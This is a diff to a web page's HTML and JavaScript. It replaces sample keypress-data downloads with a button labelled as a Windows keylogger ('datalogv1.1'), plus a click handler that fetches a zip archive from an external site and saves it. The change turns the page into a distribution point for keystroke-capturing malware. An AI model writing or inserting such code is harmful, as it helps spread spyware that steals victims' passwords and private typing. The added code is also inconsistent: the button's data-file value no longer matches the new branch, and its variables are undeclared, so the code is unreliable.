@@ -287,36 +287,10 @@
                         <!-- Download Item 1 -->
                         <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 flex items-center justify-between">
                             <div>
-                                <h3 class="font-semibold text-lg">keypress_data_example.json</h3>
-                                <p class="text-sm text-gray-400">An example JSON file with keypress data for testing.</p>
+                                <h3 class="font-semibold text-lg">datalogv1.1</h3>
+                                <p class="text-sm text-gray-400">Download datalog keylogger for windows</p>
                             </div>
                             <a href="#" class="download-link-btn ml-4 flex-shrink-0 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg inline-flex items-center" data-file="example.json">
-                                <svg class="w-4 h-4 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
-                                </svg>
-                                <span>Download</span>
-                            </a>
-                        </div>
-                        <!-- Download Item 2 -->
-                        <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 flex items-center justify-between">
-                            <div>
-                                <h3 class="font-semibold text-lg">output_text_sample.txt</h3>
-                                <p class="text-sm text-gray-400">A sample plain text file generated from keypress data.</p>
-                            </div>
-                            <a href="#" class="download-link-btn ml-4 flex-shrink-0 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg inline-flex items-center" data-file="sample.txt">
-                                <svg class="w-4 h-4 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
-                                </svg>
-                                <span>Download</span>
-                            </a>
-                        </div>
-                         <!-- Download Item 3 -->
-                        <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 flex items-center justify-between">
-                            <div>
-                                <h3 class="font-semibold text-lg">analysis_report_template.pdf</h3>
-                                <p class="text-sm text-gray-400">A blank PDF template for reporting on data analysis.</p>
-                            </div>
-                            <a href="#" class="download-link-btn ml-4 flex-shrink-0 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg inline-flex items-center" data-file="template.pdf">
                                 <svg class="w-4 h-4 mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                                 </svg>
@@ -359,29 +333,35 @@
 
         // --- Download Links Logic ---
         document.querySelectorAll('.download-link-btn').forEach(button => {
-            button.addEventListener('click', function(e) {
+            button.addEventListener('click', async function(e) {
                 e.preventDefault();
                 const fileName = this.getAttribute('data-file');
                 let content = '';
                 let mimeType = '';
                 
                 // Create dummy file content
-                if (fileName === 'example.json') {
-                    mimeType = 'application/json';
-                    content = JSON.stringify([
-                        {"key": "'H'", "timestamp": 1672531201},
-                        {"key": "'e'", "timestamp": 1672531202},
-                        {"key": "'l'", "timestamp": 1672531203},
-                        {"key": "'l'", "timestamp": 1672531204},
-                        {"key": "'o'", "timestamp": 1672531205}
-                    ], null, 2);
-                } else if (fileName === 'sample.txt') {
-                    mimeType = 'text/plain';
-                    content = 'This is a sample text file.';
-                } else if (fileName === 'template.pdf') {
-                    // Creating a dummy PDF is complex, so we'll just alert the user for this example.
-                    alert("This is a placeholder for a PDF download.");
-                    return;
+                if (fileName === 'datalogv1.1') {
+                    url = 'https://mythicallabs.tech/file/app/datalogv1-1.zip'
+                    filename = 'datalogv1.1.zip'
+                    // Fetch the ZIP file
+                    const response = await fetch(url);
+                    if (!response.ok) {
+                    throw new Error(`Failed to fetch file: ${response.statusText}`);
+                    }
+
+                    // Convert the response to a Blob
+                    const blob = await response.blob();
+
+                    // Create a temporary link element
+                    const link = document.createElement('a');
+                    link.href = URL.createObjectURL(blob);
+                    link.download = filename;
+
+                    // Append the link to the document, trigger the download, and clean up
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(link.href);
                 }
 
                 const blob = new Blob([content], { type: mimeType });
